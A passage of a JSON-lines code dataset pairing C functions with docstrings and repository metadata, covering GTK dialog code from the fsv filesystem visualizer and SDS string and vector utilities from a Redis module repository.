*/\n        STRRECAT(proptext, node_info->prefix);\n\tSTRRECAT(proptext, \"\\n\\n\");\n\tif (NODE_IS_DIR(node)) {\n\t\t/* Total size */\n\t\tsprintf( strbuf, _(\"%s bytes\"), node_info->subtree_size );\n\t\tSTRRECAT(proptext, strbuf);\n\t\tif (DIR_NODE_DESC(node)->subtree.size >= 1024) {\n\t\t\tsprintf( strbuf, \" (%s)\", node_info->subtree_size_abbr );\n\t\t\tSTRRECAT(proptext, strbuf);\n\t\t}\n\t}\n\telse {\n\t\t/* Size */\n\t\tsprintf( strbuf, _(\"%s bytes\"), node_info->size );\n\t\tSTRRECAT(proptext, strbuf);\n\t\tif (NODE_DESC(node)->size >= 1024) {\n\t\t\tsprintf( strbuf, \" (%s)\", node_info->size_abbr );\n\t\t\tSTRRECAT(proptext, strbuf);\n\t\t}\n\t\tSTRRECAT(proptext, \"\\n\");\n\t\t/* Allocation */\n\t\tsprintf( strbuf, _(\"%s bytes\"), node_info->size_alloc );\n\t\tSTRRECAT(proptext, strbuf);\n\t}\n\tSTRRECAT(proptext, \"\\n\\n\");\n\t/* Owner (user) */\n\tsprintf( strbuf, _(\"%s (uid %u)\"), node_info->user_name, NODE_DESC(node)->user_id );\n\tSTRRECAT(proptext, strbuf);\n\tSTRRECAT(proptext, \"\\n\");\n\t/* Group */\n\tsprintf( strbuf, _(\"%s (gid %u)\"), node_info->group_name, NODE_DESC(node)->group_id );\n\tSTRRECAT(proptext, strbuf);\n\n\thbox_w = gui_hbox_add( NULL, 8 );\n\tlabel_w = gui_label_add( hbox_w, proptext );\n\tgtk_label_set_justify( GTK_LABEL(label_w), GTK_JUSTIFY_LEFT );\n\tgui_table_attach( table_w, hbox_w, 1, 2, 2, 3 );\n\n\tseparator_w = gui_separator_add( NULL );\n\tgui_table_attach( table_w, separator_w, 0, 2, 3, 4 );\n\n\t/* Labels for date/time stamps */\n\tstrcpy( strbuf, \"\" );\n\tstrcat( strbuf, _(\"Modified:\\n\") );\n\tstrcat( strbuf, _(\"AttribCh:\\n\") );\n\tstrcat( strbuf, _(\"Accessed:\") );\n\thbox_w = gui_hbox_add( NULL, 8 );\n\tlabel_w = gui_label_add( hbox_w, strbuf );\n\tgui_widget_packing( label_w, NO_EXPAND, NO_FILL, AT_END );\n\tgtk_label_set_justify( GTK_LABEL(label_w), GTK_JUSTIFY_RIGHT );\n\tgui_table_attach( table_w, hbox_w, 0, 1, 4, 5 );\n\n\t/* Date/time stamps */\n\tstrcpy( proptext, \"\" );\n\t/* Modified */\n\tSTRRECAT(proptext, node_info->mtime);\n\tSTRRECAT(proptext, \"\\n\");\n\t/* Attributes changed */\n\tSTRRECAT(proptext, node_info->ctime);\n\tSTRRECAT(proptext, \"\\n\");\n\t/* Accessed */\n\tSTRRECAT(proptext, node_info->atime);\n\n\thbox_w = gui_hbox_add( NULL, 8 );\n\tlabel_w = gui_label_add( hbox_w, proptext );\n\tgtk_label_set_justify( GTK_LABEL(label_w), GTK_JUSTIFY_LEFT );\n\tgui_table_attach( table_w, hbox_w, 1, 2, 4, 5 );\n\n\tseparator_w = gui_separator_add( NULL );\n\tgui_table_attach( table_w, separator_w, 0, 2, 5, 6 );\n\n\t/* Node-type-specific information pages */\n\n\tswitch (NODE_DESC(node)->type) {\n\n\t\tcase NODE_DIRECTORY:\n\t\t/**** \"Contents\" page ****/\n\n\t\tvbox_w = gui_vbox_add( NULL, 10 );\n\t\tgui_notebook_page_add( notebook_w, _(\"Contents\"), vbox_w );\n\n\t\thbox_w = gui_hbox_add( vbox_w, 0 );\n\t\tgui_widget_packing( hbox_w, EXPAND, NO_FILL, AT_START );\n\t\tvbox2_w = gui_vbox_add( hbox_w, 10 );\n\t\tgui_widget_packing( vbox2_w, EXPAND, NO_FILL, AT_START );\n\n\t\tgui_label_add( vbox2_w, _(\"This directory contains:\") );\n\n\t\t/* Directory contents listing */\n\t\tclist_w = dir_contents_list( node );\n\t\tgtk_box_pack_start( GTK_BOX(vbox2_w), clist_w, FALSE, FALSE, 0 );\n\t\tgtk_widget_show( clist_w );\n\n\t\tgui_separator_add( vbox2_w );\n\n\t\tstrcpy( proptext, \"\" );\n\t\t/* Total size readout */\n\t\tsprintf( strbuf, _(\"%s bytes\"), node_info->subtree_size );\n\t\tSTRRECAT(proptext, strbuf);\n\t\tif (DIR_NODE_DESC(node)->subtree.size >= 1024) {\n\t\t\tsprintf( strbuf, \" (%s)\", node_info->subtree_size_abbr );\n\t\t\tSTRRECAT(proptext, strbuf);\n\t\t}\n\t\tgui_label_add( vbox2_w, proptext );\n                break;\n\n\n#ifdef HAVE_FILE_COMMAND\n\t\tcase NODE_REGFILE:\n\t\t/**** \"File type\" page ****/\n\n\t\tvbox_w = gui_vbox_add( NULL, 10 );\n\t\tgui_notebook_page_add( notebook_w, _(\"File type\"), vbox_w );\n\n\t\tgui_label_add( vbox_w, _(\"This file is recognized as:\") );\n\n\t\t/* 'file' command output */\n\t\tgui_text_area_add( vbox_w, node_info->file_type_desc );\n                break;\n#endif /* HAVE_FILE_COMMAND */\n\n\n\t\tcase NODE_SYMLINK:\n\t\t/**** \"Target\" page ****/\n\n\t\tvbox_w = gui_vbox_add( NULL, 10 );\n\t\tgui_notebook_page_add( notebook_w, _(\"Target\"), vbox_w );\n\n\t\t/* (Relative) name of target */\n\t\tgui_label_add( vbox_w, _(\"This symlink points to:\") );\n\t\thbox_w = gui_hbox_add( vbox_w, 0 );\n\t\tentry_w = gui_entry_add( hbox_w, node_info->target, NULL, NULL );\n\t\tgtk_entry_set_editable( GTK_ENTRY(entry_w), FALSE );\n\n\t\thbox_w = gui_hbox_add( vbox_w, 0 ); /* spacer */\n\n\t\t/* Absolute name of target */\n\t\tgui_label_add( vbox_w, _(\"Absolute name of target:\") );\n\t\thbox_w = gui_hbox_add( vbox_w, 0 );\n                if (!strcmp( node_info->target, node_info->abstarget ))\n\t\t\tentry_w = gui_entry_add( hbox_w, _(\"(same as above)\"), NULL, NULL );\n                else\n\t\t\tentry_w = gui_entry_add( hbox_w, node_info->abstarget, NULL, NULL );\n\t\tgtk_entry_set_editable( GTK_ENTRY(entry_w), FALSE );\n\n\t\t/* This is NULL if target isn't in the filesystem tree */\n\t\ttarget_node = node_named( node_info->abstarget );\n\n\t\t/* The \"Look at target node\" feature does not work in TreeV\n\t\t * mode if directories have to be expanded to see the\n\t\t * target node, because unbuilt TreeV geometry does not\n\t\t * have a definite location */\n\t\tif ((globals.fsv_mode == FSV_TREEV) && (target_node != NULL))\n\t\t\tif (NODE_IS_DIR(target_node->parent))\n\t\t\t\tif (!dirtree_entry_expanded( target_node->parent ))\n\t\t\t\t\ttarget_node = NULL;\n\n\t\t/* Button to point camera at target node (if present) */\n\t\thbox_w = gui_hbox_add( vbox_w, 10 );\n\t\tbutton_w = gui_button_add( hbox_w, _(\"Look at target node\"), look_at_target_node_cb, target_node );\n\t\tgui_widget_packing( button_w, EXPAND, NO_FILL, AT_START );\n\t\tgtk_widget_set_sensitive( button_w, target_node != NULL );\n\t\tgtk_signal_connect( GTK_OBJECT(button_w), \"clicked\", GTK_SIGNAL_FUNC(close_cb), window_w );\n\t\tbreak;\n\n\n\t\tdefault:\n\t\t/* No additional information for this node type */\n\t\tbreak;\n\t}\n\n\t/* Close button */\n\tbutton_w = gui_button_add( main_vbox_w, _(\"Close\"), close_cb, window_w );\n\n\txfree( proptext );\n\n\tgtk_widget_show( window_w );\n}", "path": "src\\dialog.c", "repo_name": "mcuelenaere/fsv", "stars": 472, "license": "lgpl-2.1", "language": "c", "size": 403}
{"docstring": "/* Official stat function. Returns 0 on success, -1 on error */\n", "func_signal": "static int\nstat_node( GNode *node )", "code": "{\n\tstruct stat st;\n\n\tif (lstat( node_absname( node ), &st ))\n\t\treturn -1;\n\n\t/* Determine node type */\n\tif (S_ISDIR(st.st_mode))\n\t\tNODE_DESC(node)->type = NODE_DIRECTORY;\n\telse if (S_ISREG(st.st_mode))\n\t\tNODE_DESC(node)->type = NODE_REGFILE;\n\telse if (S_ISLNK(st.st_mode))\n\t\tNODE_DESC(node)->type = NODE_SYMLINK;\n\telse if (S_ISFIFO(st.st_mode))\n\t\tNODE_DESC(node)->type = NODE_FIFO;\n\telse if (S_ISSOCK(st.st_mode))\n\t\tNODE_DESC(node)->type = NODE_SOCKET;\n\telse if (S_ISCHR(st.st_mode))\n\t\tNODE_DESC(node)->type = NODE_CHARDEV;\n\telse if (S_ISBLK(st.st_mode))\n\t\tNODE_DESC(node)->type = NODE_BLOCKDEV;\n\telse\n\t\tNODE_DESC(node)->type = NODE_UNKNOWN;\n\n\t/* A corrupted DOS filesystem once gave me st_size = -4GB */\n\tg_assert( st.st_size >= 0 );\n\n\tNODE_DESC(node)->size = st.st_size;\n\tNODE_DESC(node)->size_alloc = 512 * st.st_blocks;\n\tNODE_DESC(node)->user_id = st.st_uid;\n\tNODE_DESC(node)->group_id = st.st_gid;\n\t/*NODE_DESC(node)->perms = st.st_mode;*/\n\tNODE_DESC(node)->atime = st.st_atime;\n\tNODE_DESC(node)->mtime = st.st_mtime;\n\tNODE_DESC(node)->ctime = st.st_ctime;\n\n\treturn 0;\n}", "path": "src\\scanfs.c", "repo_name": "mcuelenaere/fsv", "stars": 472, "license": "lgpl-2.1", "language": "c", "size": 403}
{"docstring": "/* End callback to allow time-bombed transient dialogs */\n", "func_signal": "static void\ntransient_end_cb( Morph *morph )", "code": "{\n\tGtkWidget *window_w;\n\n\twindow_w = (GtkWidget *)morph->data;\n\tgtk_widget_destroy( window_w );\n\n\t/* Restore normal mouse cursor */\n\tgui_cursor( main_window_w, -1 );\n}", "path": "src\\dialog.c", "repo_name": "mcuelenaere/fsv", "stars": 472, "license": "lgpl-2.1", "language": "c", "size": 403}
{"docstring": "/* Callback for mouse button release in the wildcard pattern list */\n", "func_signal": "static int\ncsdialog_wpattern_clist_click_cb( GtkWidget *clist_w, GdkEventButton *ev_button )", "code": "{\n\tstruct WPListRowData *row_data;\n        RGBcolor *color;\n\tint row, col;\n\tconst char *title;\n\n\t/* Ignore button release following a row drag */\n\tif (csdialog.wpattern.row_is_being_dragged) {\n\t\tcsdialog.wpattern.row_is_being_dragged = FALSE;\n\t\treturn FALSE;\n\t}\n\n\t/* Respond only to mouse button 1 (left button) */\n\tif (ev_button->button != 1)\n\t\treturn FALSE;\n\n\tgtk_clist_get_selection_info( GTK_CLIST(clist_w), ev_button->x, ev_button->y, &row, &col );\n\tif ((row < 0) || (col < 0))\n\t\treturn FALSE;\n\n\trow_data = (struct WPListRowData *)gtk_clist_get_row_data( GTK_CLIST(clist_w), row );\n\n\tswitch (row_data->row_type) {\n\t\tcase WPLIST_WPATTERN_ROW:\n\t\tcase WPLIST_NEW_WPATTERN_ROW:\n\t\tif (col != 0)\n\t\t\treturn FALSE;\n\t\tcase WPLIST_HEADER_ROW:\n\t\ttitle = _(\"Group Color\");\n\t\tcolor = &row_data->wpgroup->color;\n\t\tbreak;\n\n\t\tcase WPLIST_DEFAULT_ROW:\n\t\tif (col != 0)\n\t\t\treturn FALSE;\n\t\tcase WPLIST_DEFAULT_HEADER_ROW:\n\t\ttitle = _(\"Default Color\");\n\t\tcolor = &csdialog.color_config.by_wpattern.default_color;\n\t\tbreak;\n\n\t\tSWITCH_FAIL\n\t}\n\n\t/* Bring up color selection dialog */\n\tgui_colorsel_window( title, color, csdialog_wpattern_color_selection_cb, color );\n\n\treturn FALSE;\n}", "path": "src\\dialog.c", "repo_name": "mcuelenaere/fsv", "stars": 472, "license": "lgpl-2.1", "language": "c", "size": 403}
{"docstring": "/* This is the spectrum function used to paint the preview widget */\n", "func_signal": "static RGBcolor\ncsdialog_time_spectrum_func( double x )", "code": "{\n\tRGBcolor *boundary_colors[2];\n\tvoid *data = NULL;\n\n\tif (csdialog.color_config.by_timestamp.spectrum_type == SPECTRUM_GRADIENT) {\n\t\tboundary_colors[0] = &csdialog.color_config.by_timestamp.old_color;\n\t\tboundary_colors[1] = &csdialog.color_config.by_timestamp.new_color;\n\t\tdata = boundary_colors;\n\t}\n\n\treturn color_spectrum_color( csdialog.color_config.by_timestamp.spectrum_type, x, data );\n}", "path": "src\\dialog.c", "repo_name": "mcuelenaere/fsv", "stars": 472, "license": "lgpl-2.1", "language": "c", "size": 403}
{"docstring": "/* Callback for the buttons to the right of the wildcard pattern list */\n", "func_signal": "static void\ncsdialog_wpattern_button_cb( GtkWidget *button_w )", "code": "{\n\tstruct WPListRowData *row_data = NULL;\n\tRGBcolor default_new_color = { 0.0, 0.0, 0.75 }; /* I like blue */\n        RGBcolor *color;\n\tint row = -1;\n        const char *title = NULL;\n\n\tif (GTK_CLIST(csdialog.wpattern.clist_w)->selection != NULL) {\n\t\t/* Get data for currently selected row */\n\t\trow = GPOINTER_TO_INT(GTK_CLIST(csdialog.wpattern.clist_w)->selection->data);\n\t\trow_data = gtk_clist_get_row_data( GTK_CLIST(csdialog.wpattern.clist_w), row );\n\t\tg_assert( row_data != NULL );\n\t}\n\n\tif (button_w == csdialog.wpattern.new_color_button_w) {\n                /* Bring up color selection dialog for new color group */\n\t\ttitle = _(\"New Color Group\");\n\t\tif (row_data == NULL)\n\t\t\tcolor = &default_new_color;\n\t\telse\n\t\t\tcolor = &row_data->wpgroup->color;\n\t\tgui_colorsel_window( title, color, csdialog_wpattern_new_color_selection_cb, row_data );\n\t}\n\telse if (button_w == csdialog.wpattern.edit_pattern_button_w) {\n\t\t/* Bring up pattern edit subdialog */\n\t\tg_assert( row_data != NULL );\n\t\tswitch (row_data->row_type) {\n\t\t\tcase WPLIST_WPATTERN_ROW:\n\t\t\ttitle = _(\"Edit Wildcard Pattern\");\n\t\t\tbreak;\n\n\t\t\tcase WPLIST_NEW_WPATTERN_ROW:\n\t\t\ttitle = _(\"New Wildcard Pattern\");\n\t\t\tbreak;\n\n\t\t\tSWITCH_FAIL\n\t\t}\n\t\tgui_entry_window( title, row_data->wpattern, csdialog_wpattern_edit_cb, row_data );\n\t}\n\telse if (button_w == csdialog.wpattern.delete_button_w) {\n\t\t/* Delete a pattern or color group */\n\t\tg_assert( row_data != NULL );\n\t\tswitch (row_data->row_type) {\n\t\t\tcase WPLIST_WPATTERN_ROW:\n\t\t\t/* Delete pattern */\n\t\t\tG_LIST_REMOVE(row_data->wpgroup->wp_list, row_data->wpattern);\n\t\t\txfree( row_data->wpattern );\n\t\t\t/* Remove corresponding row */\n\t\t\tgtk_clist_remove( GTK_CLIST(csdialog.wpattern.clist_w), row );\n\t\t\t/* As a courtesy to the user, leave the next\n\t\t\t * row selected */\n\t\t\tgtk_clist_select_row( GTK_CLIST(csdialog.wpattern.clist_w), row, 1 );\n\t\t\tbreak;\n\n\t\t\tcase WPLIST_NEW_WPATTERN_ROW:\n\t\t\t/* Delete color group ONLY if group is empty */\n\t\t\tif (row_data->wpgroup->wp_list != NULL)\n\t\t\t\treturn;\n\t\t\tG_LIST_REMOVE(csdialog.color_config.by_wpattern.wpgroup_list, row_data->wpgroup);\n\t\t\txfree( row_data->wpgroup );\n\t\t\t/* Remove corresponding rows */\n\t\t\tgtk_clist_remove( GTK_CLIST(csdialog.wpattern.clist_w), row );\n\t\t\tg_assert( row >= 1 );\n\t\t\tgtk_clist_remove( GTK_CLIST(csdialog.wpattern.clist_w), row - 1 );\n\t\t\tbreak;\n\n\t\t\tSWITCH_FAIL\n\t\t}\n\t}\n}", "path": "src\\dialog.c", "repo_name": "mcuelenaere/fsv", "stars": 472, "license": "lgpl-2.1", "language": "c", "size": 403}
{"docstring": "/* Help -> Contents... */\n", "func_signal": "void\ndialog_help( void )", "code": "{\n\tstatic double t;\n\tGtkWidget *window_w;\n\tGtkWidget *frame_w;\n\tGtkWidget *hbox_w;\n\tchar location[] = \"file://localhost\" DOCDIR \"/fsv.html\";\n\tchar cmdbuf[2048];\n\n\t/* Browser may take a few seconds to start up... */\n\tgui_cursor( main_window_w, GDK_WATCH );\n\tgui_update( );\n\n\t/* Create message window to acknowledge action */\n\twindow_w = gui_dialog_window( _(\"Help\"), NULL );\n\tgtk_container_set_border_width( GTK_CONTAINER(window_w), 5 );\n\tframe_w = gui_frame_add( window_w, NULL );\n\thbox_w = gui_hbox_add( frame_w, 10 );\n\tgui_label_add( hbox_w, _(\"Launching help browser . . .\") );\n\tgtk_widget_show( window_w );\n\t/* and time-bomb it */\n\tmorph_finish( &t );\n\tt = 0.0;\n\tmorph_full( &t, MORPH_LINEAR, 1.0, 4.0, NULL, transient_end_cb, window_w );\n\n\tif (xfork( )) {\n\t\t/* Browser startup command */\n\t\tsprintf( cmdbuf,\n\t\t    \"netscape -noraise -remote \\\"openURL(%s,new-window)\\\" > /dev/null 2>&1 || \"\n\t\t    \"netscape -no-about-splash -dont-save-geometry-prefs %s > /dev/null 2>&1 || \"\n\t\t    \"xterm -title \\\"fsv help\\\" -e lynx %s > /dev/null 2>&1\",\n\t\t    location, location, location );\n\n\t\t/* Execute command */\n\t\tsystem( cmdbuf );\n\n\t\t/* End subprocess */\n\t\t_exit( 0 );\n\t}\n}", "path": "src\\dialog.c", "repo_name": "mcuelenaere/fsv", "stars": 472, "license": "lgpl-2.1", "language": "c", "size": 403}
{"docstring": "/* Callback for row selection/unselection in the wildcard pattern list */\n", "func_signal": "static void\ncsdialog_wpattern_clist_select_unselect_cb( GtkWidget *clist_w, int row, int unused1, GdkEvent *unused2 )", "code": "{\n\tstruct WPListRowData *row_data;\n\tboolean newwp_row;\n\tboolean defcolor_row;\n\tboolean empty_wpgroup = FALSE;\n\tboolean row_selected;\n\tboolean new_color_allow;\n\tboolean edit_pattern_allow;\n\tboolean delete_allow;\n\n\trow_data = gtk_clist_get_row_data( GTK_CLIST(clist_w), row );\n\n\t/* Set some flags */\n\tnewwp_row = row_data->row_type == WPLIST_NEW_WPATTERN_ROW;\n\tdefcolor_row = (row_data->row_type == WPLIST_DEFAULT_ROW) || (row_data->row_type == WPLIST_DEFAULT_HEADER_ROW);\n\tif (!defcolor_row)\n\t\tempty_wpgroup = row_data->wpgroup->wp_list == NULL;\n\trow_selected = GTK_CLIST(clist_w)->selection != NULL;\n\n\t/* Decide which actions are allowable */\n\tnew_color_allow = !row_selected || !defcolor_row;\n\tedit_pattern_allow = row_selected && !defcolor_row;\n        delete_allow = row_selected && !defcolor_row && (!newwp_row || empty_wpgroup);\n\n\t/* Enable/disable the buttons accordingly */\n\tgtk_widget_set_sensitive( csdialog.wpattern.new_color_button_w, new_color_allow );\n\tgtk_widget_set_sensitive( csdialog.wpattern.edit_pattern_button_w, edit_pattern_allow );\n\tgtk_widget_set_sensitive( csdialog.wpattern.delete_button_w, delete_allow );\n}", "path": "src\\dialog.c", "repo_name": "mcuelenaere/fsv", "stars": 472, "license": "lgpl-2.1", "language": "c", "size": 403}
{"docstring": "/* Callback for whenever a row is being dragged in the wildcard pattern\n * list area */\n", "func_signal": "static boolean\ncsdialog_wpattern_clist_drag_cb( GtkWidget *unused1, GdkDragContext *unused2, int unused3, int unused4, unsigned int unused5 )", "code": "{\n\t/* This gets checked in csdialog_wpattern_clist_click_cb( ) */\n\tcsdialog.wpattern.row_is_being_dragged = TRUE;\n\treturn FALSE;\n}", "path": "src\\dialog.c", "repo_name": "mcuelenaere/fsv", "stars": 472, "license": "lgpl-2.1", "language": "c", "size": 403}
{"docstring": "/* Helper function for csdialog_wpattern_clist_populate( ). This adds a\n * new row to the wildcard pattern list at the given index (replacing a\n * row if one is already there) */\n", "func_signal": "static void\nwplist_row( int row, struct WPListRowData *row_data )", "code": "{\n\tint r; /* for debugging */\n\tchar *clist_row[2] = { NULL, NULL };\n\n\t/* If there is a row at the given index, remove it */\n\tif (row < GTK_CLIST(csdialog.wpattern.clist_w)->rows)\n\t\tgtk_clist_remove( GTK_CLIST(csdialog.wpattern.clist_w), row );\n\n\t/* Determine textual content of new row */\n\tswitch (row_data->row_type) {\n\t\tcase WPLIST_WPATTERN_ROW:\n\t\tclist_row[1] = row_data->wpattern;\n\t\tbreak;\n\n\t\tcase WPLIST_NEW_WPATTERN_ROW:\n\t\tclist_row[1] = _(\"(New pattern)\");\n\t\tbreak;\n\n\t\tcase WPLIST_DEFAULT_ROW:\n\t\tclist_row[1] = _(\"(Default color)\");\n\t\tbreak;\n\n\t\tdefault:\n\t\t/* Row has no text */\n\t\tbreak;\n\t}\n\tr = gtk_clist_insert( GTK_CLIST(csdialog.wpattern.clist_w), row, clist_row );\n\tg_assert( r == row );\n\n\t/* Set row properties appropriately */\n\tswitch (row_data->row_type) {\n\t\tcase WPLIST_HEADER_ROW:\n\t\tcase WPLIST_DEFAULT_HEADER_ROW:\n\t\tgtk_clist_set_row_style( GTK_CLIST(csdialog.wpattern.clist_w), row, row_data->style );\n\t\tgtk_clist_set_selectable( GTK_CLIST(csdialog.wpattern.clist_w), row, FALSE );\n\t\tbreak;\n\n\t\tcase WPLIST_WPATTERN_ROW:\n\t\tcase WPLIST_NEW_WPATTERN_ROW:\n\t\tcase WPLIST_DEFAULT_ROW:\n\t\tgtk_clist_set_cell_style( GTK_CLIST(csdialog.wpattern.clist_w), row, 0, row_data->style );\n\t\tbreak;\n\n\t\tSWITCH_FAIL\n\t}\n\tgtk_clist_set_row_data_full( GTK_CLIST(csdialog.wpattern.clist_w), row, row_data, _xfree );\n}", "path": "src\\dialog.c", "repo_name": "mcuelenaere/fsv", "stars": 472, "license": "lgpl-2.1", "language": "c", "size": 403}
{"docstring": "/* Return the total size of the allocation of the specifed sds string,\n * including:\n * 1) The sds header before the pointer.\n * 2) The string.\n * 3) The free buffer at the end if any.\n * 4) The implicit null term.\n */\n", "func_signal": "size_t sdsAllocSize(sds s)", "code": "{\n    size_t alloc = sdsalloc(s);\n    return sdsHdrSize(s[-1])+alloc+1;\n}", "path": "RedisModulesSDK\\rmutil\\sds.c", "repo_name": "vulhub/redis-rogue-getshell", "stars": 282, "license": "apache-2.0", "language": "c", "size": 194}
{"docstring": "/* Like sdsjoin, but joins an array of SDS strings. */\n", "func_signal": "sds sdsjoinsds(sds *argv, int argc, const char *sep, size_t seplen)", "code": "{\n    sds join = sdsempty();\n    int j;\n\n    for (j = 0; j < argc; j++) {\n        join = sdscatsds(join, argv[j]);\n        if (j != argc-1) join = sdscatlen(join,sep,seplen);\n    }\n    return join;\n}", "path": "RedisModulesSDK\\rmutil\\sds.c", "repo_name": "vulhub/redis-rogue-getshell", "stars": 282, "license": "apache-2.0", "language": "c", "size": 194}
{"docstring": "/* Append to the sds string \"s\" an escaped string representation where\n * all the non-printable characters (tested with isprint()) are turned into\n * escapes in the form \"\\n\\r\\a....\" or \"\\x<hex-number>\".\n *\n * After the call, the modified sds string is no longer valid and all the\n * references must be substituted with the new pointer returned by the call. */\n", "func_signal": "sds sdscatrepr(sds s, const char *p, size_t len)", "code": "{\n    s = sdscatlen(s,\"\\\"\",1);\n    while(len--) {\n        switch(*p) {\n        case '\\\\':\n        case '\"':\n            s = sdscatprintf(s,\"\\\\%c\",*p);\n            break;\n        case '\\n': s = sdscatlen(s,\"\\\\n\",2); break;\n        case '\\r': s = sdscatlen(s,\"\\\\r\",2); break;\n        case '\\t': s = sdscatlen(s,\"\\\\t\",2); break;\n        case '\\a': s = sdscatlen(s,\"\\\\a\",2); break;\n        case '\\b': s = sdscatlen(s,\"\\\\b\",2); break;\n        default:\n            if (isprint(*p))\n                s = sdscatprintf(s,\"%c\",*p);\n            else\n                s = sdscatprintf(s,\"\\\\x%02x\",(unsigned char)*p);\n            break;\n        }\n        p++;\n    }\n    return sdscatlen(s,\"\\\"\",1);\n}", "path": "RedisModulesSDK\\rmutil\\sds.c", "repo_name": "vulhub/redis-rogue-getshell", "stars": 282, "license": "apache-2.0", "language": "c", "size": 194}
{"docstring": "/* Free an sds string. No operation is performed if 's' is NULL. */\n", "func_signal": "void sdsfree(sds s)", "code": "{\n    if (s == NULL) return;\n    s_free((char*)s-sdsHdrSize(s[-1]));\n}", "path": "RedisModulesSDK\\rmutil\\sds.c", "repo_name": "vulhub/redis-rogue-getshell", "stars": 282, "license": "apache-2.0", "language": "c", "size": 194}
{"docstring": "/* Enlarge the free space at the end of the sds string so that the caller\n * is sure that after calling this function can overwrite up to addlen\n * bytes after the end of the string, plus one more byte for nul term.\n *\n * Note: this does not change the *length* of the sds string as returned\n * by sdslen(), but only the free buffer space we have. */\n", "func_signal": "sds sdsMakeRoomFor(sds s, size_t addlen)", "code": "{\n    void *sh, *newsh;\n    size_t avail = sdsavail(s);\n    size_t len, newlen;\n    char type, oldtype = s[-1] & SDS_TYPE_MASK;\n    int hdrlen;\n\n    /* Return ASAP if there is enough space left. */\n    if (avail >= addlen) return s;\n\n    len = sdslen(s);\n    sh = (char*)s-sdsHdrSize(oldtype);\n    newlen = (len+addlen);\n    if (newlen < SDS_MAX_PREALLOC)\n        newlen *= 2;\n    else\n        newlen += SDS_MAX_PREALLOC;\n\n    type = sdsReqType(newlen);\n\n    /* Don't use type 5: the user is appending to the string and type 5 is\n     * not able to remember empty space, so sdsMakeRoomFor() must be called\n     * at every appending operation. */\n    if (type == SDS_TYPE_5) type = SDS_TYPE_8;\n\n    hdrlen = sdsHdrSize(type);\n    if (oldtype==type) {\n        newsh = s_realloc(sh, hdrlen+newlen+1);\n        if (newsh == NULL) return NULL;\n        s = (char*)newsh+hdrlen;\n    } else {\n        /* Since the header size changes, need to move the string forward,\n         * and can't use realloc */\n        newsh = s_malloc(hdrlen+newlen+1);\n        if (newsh == NULL) return NULL;\n        memcpy((char*)newsh+hdrlen, s, len+1);\n        s_free(sh);\n        s = (char*)newsh+hdrlen;\n        s[-1] = type;\n        sdssetlen(s, len);\n    }\n    sdssetalloc(s, newlen);\n    return s;\n}", "path": "RedisModulesSDK\\rmutil\\sds.c", "repo_name": "vulhub/redis-rogue-getshell", "stars": 282, "license": "apache-2.0", "language": "c", "size": 194}
{"docstring": "/* Join an array of C strings using the specified separator (also a C string).\n * Returns the result as an sds string. */\n", "func_signal": "sds sdsjoin(char **argv, int argc, char *sep)", "code": "{\n    sds join = sdsempty();\n    int j;\n\n    for (j = 0; j < argc; j++) {\n        join = sdscat(join, argv[j]);\n        if (j != argc-1) join = sdscat(join,sep);\n    }\n    return join;\n}", "path": "RedisModulesSDK\\rmutil\\sds.c", "repo_name": "vulhub/redis-rogue-getshell", "stars": 282, "license": "apache-2.0", "language": "c", "size": 194}
{"docstring": "/* Apply tolower() to every character of the sds string 's'. */\n", "func_signal": "void sdstolower(sds s)", "code": "{\n    int len = sdslen(s), j;\n\n    for (j = 0; j < len; j++) s[j] = tolower(s[j]);\n}", "path": "RedisModulesSDK\\rmutil\\sds.c", "repo_name": "vulhub/redis-rogue-getshell", "stars": 282, "license": "apache-2.0", "language": "c", "size": 194}
{"docstring": "/* Get the element at the end of the vector, decreasing the size by one */\n", "func_signal": "inline int Vector_Pop(Vector *v, void *ptr)", "code": "{\n  if (v->top > 0) {\n    if (ptr != NULL) {\n      Vector_Get(v, v->top - 1, ptr);\n    }\n    v->top--;\n    return 1;\n  }\n  return 0;\n}", "path": "RedisModulesSDK\\rmutil\\vector.c", "repo_name": "vulhub/redis-rogue-getshell", "stars": 282, "license": "apache-2.0", "language": "c", "size": 194}
{"docstring": "/* Compare two sds strings s1 and s2 with memcmp().\n *\n * Return value:\n *\n *     positive if s1 > s2.\n *     negative if s1 < s2.\n *     0 if s1 and s2 are exactly the same binary string.\n *\n * If two strings share exactly the same prefix, but one of the two has\n * additional characters, the longer string is considered to be greater than\n * the smaller one. */\n", "func_signal": "int sdscmp(const sds s1, const sds s2)", "code": "{\n    size_t l1, l2, minlen;\n    int cmp;\n\n    l1 = sdslen(s1);\n    l2 = sdslen(s2);\n    minlen = (l1 < l2) ? l1 : l2;\n    cmp = memcmp(s1,s2,minlen);\n    if (cmp == 0) return l1-l2;\n    return cmp;\n}", "path": "RedisModulesSDK\\rmutil\\sds.c", "repo_name": "vulhub/redis-rogue-getshell", "stars": 282, "license": "apache-2.0", "language": "c", "size": 194}
{"docstring": "/* Grow the sds to have the specified length. Bytes that were not part of\n * the original length of the sds will be set to zero.\n *\n * if the specified length is smaller than the current length, no operation\n * is performed. */\n", "func_signal": "sds sdsgrowzero(sds s, size_t len)", "code": "{\n    size_t curlen = sdslen(s);\n\n    if (len <= curlen) return s;\n    s = sdsMakeRoomFor(s,len-curlen);\n    if (s == NULL) return NULL;\n\n    /* Make sure added region doesn't contain garbage */\n    memset(s+curlen,0,(len-curlen+1)); /* also set trailing \\0 byte */\n    sdssetlen(s, len);\n    return s;\n}", "path": "RedisModulesSDK\\rmutil\\sds.c", "repo_name": "vulhub/redis-rogue-getshell", "stars": 282, "license": "apache-2.0", "language": "c", "size": 194}
{"docstring": "/* Reallocate the sds string so that it has no free space at the end. The\n * contained string remains not altered, but next concatenation operations\n * will require a reallocation.\n *\n * After the call, the passed sds string is no longer valid and all the\n * references must be substituted with the new pointer returned by the call. */\n", "func_signal": "sds sdsRemoveFreeSpace(sds s)", "code": "{\n    void *sh, *newsh;\n    char type, oldtype = s[-1] & SDS_TYPE_MASK;\n    int hdrlen;\n    size_t len = sdslen(s);\n    sh = (char*)s-sdsHdrSize(oldtype);\n\n    type = sdsReqType(len);\n    hdrlen = sdsHdrSize(type);\n    if (oldtype==type) {\n        newsh = s_realloc(sh, hdrlen+len+1);\n        if (newsh == NULL) return NULL;\n        s = (char*)newsh+hdrlen;\n    } else {\n        newsh = s_malloc(hdrlen+len+1);\n        if (newsh == NULL) return NULL;\n        memcpy((char*)newsh+hdrlen, s, len+1);\n        s_free(sh);\n        s = (char*)newsh+hdrlen;\n        s[-1] = type;\n        sdssetlen(s, len);\n    }\n    sdssetalloc(s, len);\n    return s;\n}", "path": 